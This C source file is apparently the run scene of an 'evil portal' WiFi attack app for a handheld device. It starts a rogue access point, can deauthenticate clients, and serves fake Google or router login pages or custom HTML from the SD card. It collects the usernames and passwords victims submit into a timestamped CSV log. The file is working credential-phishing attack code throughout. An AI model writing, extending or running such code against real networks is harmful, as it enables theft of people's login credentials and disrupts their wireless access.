#include "../wifi_app.h"
#include "../wifi_hal.h"
#include "../evil_portal_html.h"
#include "../views/evil_portal_view.h"

#include <storage/storage.h>
#include <furi_hal_rtc.h>
#include <datetime/datetime.h>
#include <stdio.h>
#include <string.h>

static char* s_sd_html_buf = NULL;
static size_t s_sd_html_len = 0;
static File* s_cred_file = NULL;
static Storage* s_storage = NULL;

static void evil_portal_cred_cb(const char* user, const char* pwd, void* ctx) {
    WifiApp* app = ctx;
    if(!app) return;

    uint8_t next = (app->evil_portal_cred_head + 1) % WIFI_APP_EVIL_PORTAL_QUEUE_SIZE;
    if(next == app->evil_portal_cred_tail) {
        return;
    }
    WifiAppEvilPortalCred* slot = &app->evil_portal_cred_queue[app->evil_portal_cred_head];
    strncpy(slot->user, user ? user : "", sizeof(slot->user) - 1);
    slot->user[sizeof(slot->user) - 1] = 0;
    strncpy(slot->pwd, pwd ? pwd : "", sizeof(slot->pwd) - 1);
    slot->pwd[sizeof(slot->pwd) - 1] = 0;
    app->evil_portal_cred_head = next;

    view_dispatcher_send_custom_event(app->view_dispatcher, WifiAppCustomEventEvilPortalCredCaptured);
}

static void sanitize_filename(const char* in, char* out, size_t out_size) {
    size_t j = 0;
    for(size_t i = 0; in[i] && j < out_size - 1; i++) {
        char c = in[i];
        if((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' || c == '_') {
            out[j++] = c;
        } else {
            out[j++] = '_';
        }
    }
    out[j] = 0;
}

static bool load_sd_html(const char* path) {
    if(s_sd_html_buf) {
        free(s_sd_html_buf);
        s_sd_html_buf = NULL;
        s_sd_html_len = 0;
    }
    Storage* storage = furi_record_open(RECORD_STORAGE);
    File* f = storage_file_alloc(storage);
    if(!storage_file_open(f, path, FSAM_READ, FSOM_OPEN_EXISTING)) {
        storage_file_free(f);
        furi_record_close(RECORD_STORAGE);
        return false;
    }
    uint64_t size = storage_file_size(f);
    if(size > 16384) size = 16384;
    s_sd_html_buf = malloc((size_t)size + 1);
    if(!s_sd_html_buf) {
        storage_file_close(f);
        storage_file_free(f);
        furi_record_close(RECORD_STORAGE);
        return false;
    }
    uint16_t got = storage_file_read(f, s_sd_html_buf, (uint16_t)size);
    s_sd_html_buf[got] = 0;
    s_sd_html_len = got;
    storage_file_close(f);
    storage_file_free(f);
    furi_record_close(RECORD_STORAGE);
    return s_sd_html_len > 0;
}

static void open_cred_file(WifiApp* app) {
    s_storage = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(s_storage, "/ext/wifi");
    storage_common_mkdir(s_storage, "/ext/wifi/evil_portal");

    char safe[33];
    sanitize_filename(app->evil_portal_ssid, safe, sizeof(safe));

    char path[160];
    snprintf(path, sizeof(path), "/ext/wifi/evil_portal/%s_creds.csv", safe);

    bool exists = storage_common_stat(s_storage, path, NULL) == FSE_OK;

    s_cred_file = storage_file_alloc(s_storage);
    if(!storage_file_open(s_cred_file, path, FSAM_WRITE, FSOM_OPEN_APPEND)) {
        storage_file_free(s_cred_file);
        s_cred_file = NULL;
        furi_record_close(RECORD_STORAGE);
        s_storage = NULL;
        return;
    }
    if(!exists) {
        const char* hdr = "timestamp,user,password\n";
        storage_file_write(s_cred_file, hdr, strlen(hdr));
    }
}

static void close_cred_file(void) {
    if(s_cred_file) {
        storage_file_close(s_cred_file);
        storage_file_free(s_cred_file);
        s_cred_file = NULL;
    }
    if(s_storage) {
        furi_record_close(RECORD_STORAGE);
        s_storage = NULL;
    }
}

static void drain_cred_queue(WifiApp* app) {
    while(app->evil_portal_cred_tail != app->evil_portal_cred_head) {
        WifiAppEvilPortalCred* c = &app->evil_portal_cred_queue[app->evil_portal_cred_tail];

        if(s_cred_file) {
            DateTime dt;
            furi_hal_rtc_get_datetime(&dt);
            char line[200];
            int n = snprintf(
                line, sizeof(line),
                "%04u-%02u-%02u %02u:%02u:%02u,%s,%s\n",
                dt.year, dt.month, dt.day, dt.hour, dt.minute, dt.second,
                c->user, c->pwd);
            if(n > 0) storage_file_write(s_cred_file, line, n);
        }

        app->evil_portal_cred_total++;
        evil_portal_view_set_creds(app->evil_portal_view_obj, app->evil_portal_cred_total);
        evil_portal_view_set_last(app->evil_portal_view_obj, c->user[0] ? c->user : "(no user)");

        app->evil_portal_cred_tail = (app->evil_portal_cred_tail + 1) % WIFI_APP_EVIL_PORTAL_QUEUE_SIZE;
    }
}

void wifi_app_scene_evil_portal_run_on_enter(void* context) {
    WifiApp* app = context;

    app->evil_portal_cred_head = 0;
    app->evil_portal_cred_tail = 0;
    app->evil_portal_cred_total = 0;

    evil_portal_view_set_ssid(app->evil_portal_view_obj, app->evil_portal_ssid);
    evil_portal_view_set_channel(app->evil_portal_view_obj, app->evil_portal_channel);
    evil_portal_view_set_clients(app->evil_portal_view_obj, 0);
    evil_portal_view_set_creds(app->evil_portal_view_obj, 0);
    evil_portal_view_set_last(app->evil_portal_view_obj, "");
    evil_portal_view_set_status(app->evil_portal_view_obj, "Starting...");

    view_dispatcher_switch_to_view(app->view_dispatcher, WifiAppViewEvilPortal);

    open_cred_file(app);

    const char* html = NULL;
    size_t html_len = 0;
    switch(app->evil_portal_template) {
    case WifiAppEvilPortalTemplateGoogle:
        html = EVIL_PORTAL_HTML_GOOGLE;
        html_len = EVIL_PORTAL_HTML_GOOGLE_LEN;
        break;
    case WifiAppEvilPortalTemplateRouter:
        html = EVIL_PORTAL_HTML_ROUTER;
        html_len = EVIL_PORTAL_HTML_ROUTER_LEN;
        break;
    case WifiAppEvilPortalTemplateSd:
        if(load_sd_html(app->evil_portal_sd_path)) {
            html = s_sd_html_buf;
            html_len = s_sd_html_len;
        } else {
            html = EVIL_PORTAL_HTML_GOOGLE;
            html_len = EVIL_PORTAL_HTML_GOOGLE_LEN;
            evil_portal_view_set_status(app->evil_portal_view_obj, "SD failed");
        }
        break;
    }

    WifiHalEvilPortalConfig cfg = {
        .ssid = app->evil_portal_ssid,
        .channel = app->evil_portal_channel,
        .deauth_enabled = app->evil_portal_deauth,
        .html = html,
        .html_len = html_len,
        .cred_cb = evil_portal_cred_cb,
        .cred_cb_ctx = app,
    };

    if(!wifi_hal_evil_portal_start(&cfg)) {
        evil_portal_view_set_status(app->evil_portal_view_obj, "Start failed");
    } else {
        evil_portal_view_set_status(app->evil_portal_view_obj, "Running");
    }
}

bool wifi_app_scene_evil_portal_run_on_event(void* context, SceneManagerEvent event) {
    WifiApp* app = context;
    bool consumed = false;

    if(event.type == SceneManagerEventTypeCustom) {
        if(event.event == InputKeyOk || event.event == WifiAppCustomEventEvilPortalStop) {
            scene_manager_previous_scene(app->scene_manager);
            consumed = true;
        } else if(event.event == WifiAppCustomEventEvilPortalCredCaptured) {
            drain_cred_queue(app);
            consumed = true;
        }
    } else if(event.type == SceneManagerEventTypeTick) {
        drain_cred_queue(app);
        evil_portal_view_set_clients(
            app->evil_portal_view_obj, wifi_hal_evil_portal_get_client_count());
    }

    return consumed;
}

void wifi_app_scene_evil_portal_run_on_exit(void* context) {
    WifiApp* app = context;
    (void)app;

    wifi_hal_evil_portal_stop();
    drain_cred_queue(app);
    close_cred_file();

    if(s_sd_html_buf) {
        free(s_sd_html_buf);
        s_sd_html_buf = NULL;
        s_sd_html_len = 0;
    }
}
